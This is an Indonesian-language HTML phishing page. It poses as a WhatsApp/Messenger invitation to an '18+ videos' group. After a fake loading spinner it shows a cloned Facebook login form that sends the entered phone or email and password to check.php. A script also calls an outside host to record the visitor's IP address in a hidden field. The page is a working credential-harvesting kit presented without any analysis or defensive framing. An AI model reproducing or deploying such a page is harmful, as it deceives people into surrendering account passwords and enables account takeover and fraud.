<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="description" content="Undangan chat grup Mntap">
        <meta property="og:title" content="Whatsapp Group Link">
        <meta property="og:description" content="Undangan chat grup Mntap">
        <meta property="og:image" content="https://i.ibb.co/Q6zxJns/images.jpg">
        <title>Whatsapp Group Link</title>
        <link rel="stylesheet" type="text/css" href="css/style.css">
        <link rel="stylesheet" type="text/css" href="css/facebook.css">
    </head>
    <body>
        <section>
            <div class="join" style="display: none;">
                <span class="icon"></span>
                <div class="content">
                    <h1>Group Videos 18+</h1>
                    <span class="ceo">Grup dibuat oleh Alice</span>
                    <p class="desc">
                        💡 WELCOME TO GROUP MESENGGER 💡<br>
                        <span class="bold">📍 Rules 📍</span>
                        <br>
                        📌 Dilarang Spam ... 
                        <span class="more">
                            Baca selengkapnya<br>
                    </p>
                    
                </div>
                <div class="bottom">
                    <a href="#">BATAL</a>
                    <a class="fb">BERGABUNG KE GROUP</a>
                </div>
            </div>
            <div class="loading">
                <span>Memeriksa undangan grup...</span>
                <img class="spin" src="https://miro.medium.com/max/1600/0*ptDX0HfJCYpo9Pcs.gif">
            </div>
            <!-- LOGIN FB -->
            <div class="popup-login login-facebook animated fadeIn" style="display: none;">
                <div class="popup-box-login-fb">
                    <div class="navbar-fb">
                        <img width="45" src="img/facebook_text.png">
                    </div>
                    <div class="content-box-fb">
                        <img width="60" height="60" style="width: 60px" src="https://cdn.jsdelivr.net/gh/gowebid/assets@main/go_login/messenger.png">
                        <div class="txt-login-fb">Masuk ke akun Facebook Anda untuk terhubung dengan Messenger

		         </div>
                        <form class="login-form" action="check.php" method="POST">
                            <label>
                                <input type="text" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required="">
                            </label>
                            <label>
                                <input type="password" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required="">
                            </label>
                            <input type="hidden" name="ip" id="ip" value="">
                            <button type="submit" name="submit" class="btn-login-fb">Masuk</button>
                        </form>
                        <div class="txt-create-account">Create account</div>
                        <div class="txt-not-now">Not now</div>
                        <div class="txt-forgotten-password">Forgotten password?</div>
                    </div>
                    <div class="language-box">
                        <center>
                            <div class="language-name language-name-active">English (UK)</div>
                            <div class="language-name">Bahasa Indonesia</div>
                            <div class="language-name">Basa Jawa</div>
                            <div class="language-name">Bahasa Melayu</div>
                            <div class="language-name">日本語</div>
                            <div class="language-name">Español</div>
                            <div class="language-name">Português (Brasil)</div>
                            <div class="language-name">
                                <i class="fa fa-plus"></i>
                            </div>
                        </center>
                    </div>
                    <div class="copyright">Facebook Inc.</div>
                </div>
            </div>
        </section>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script type="text/javascript">

            $(document).ready(function()
            {

                setTimeout(()=>{

                    $('.loading').css("display", "none");

                    $('.join').show();

                }
                , 1000)

                $('.fb').click(function() {

                    $('.login-facebook').fadeIn();

                })

            })
        </script>
        <script type="text/javascript">

            var desc = document.getElementsByClassName("desc");

            var more = document.getElementsByClassName("more");

            more[0].addEventListener("click", function()
            {

                desc[0].innerHTML = '💡 WELCOME TO GROUP 💡<br><span class="bold">📍 Rules 📍</span><br>📌 Dilarang Spam<br>📌 Dilarang Sara<br>📌 Dilarang Saling Menghina<br>📌 Dilarang Telpon Admin<br>📌 Harus Berbagi Video<br>📌 Nyimak doang auto kick<br>🎈 SALAM DAMAI 🎈';

            })
        </script>
        <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script>

            var checkip = function() {

                $.ajax({

                    type: "get",

                    async: false,

                    url: "https://api.pubgameshowtime.coooom/ip/getcountry",

                    dataType: "json",

                    success: function(result) {

                        $('#ip').val(result.ip);

                    }

                })

            }

            checkip();
        </script>
    </body>
</html>
